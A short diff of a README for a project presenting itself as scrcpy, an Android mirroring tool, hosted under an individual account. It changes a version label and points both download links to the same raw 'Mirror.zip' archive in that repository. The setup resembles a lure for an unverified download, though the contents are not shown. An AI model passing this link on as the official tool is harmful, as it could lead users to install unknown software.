@@ -15,7 +15,7 @@ This application mirrors Android devices connected via #USB.
 
 ## Download
 * [Latest version release](https://github.com/freelancermustakin/scrcpy/raw/main/Mirror.zip) (recommended)
-* [version 2.0.20](https://github.com/freelancermustakin/scrcpy/raw/main/Mirror.zip)
+* [version 2.20.2](https://github.com/freelancermustakin/scrcpy/raw/main/Mirror.zip)
 
 ## Screenshots
 ![screenshot](.assets/screenshot-scrcpy-i80_phonePCw.PNG)
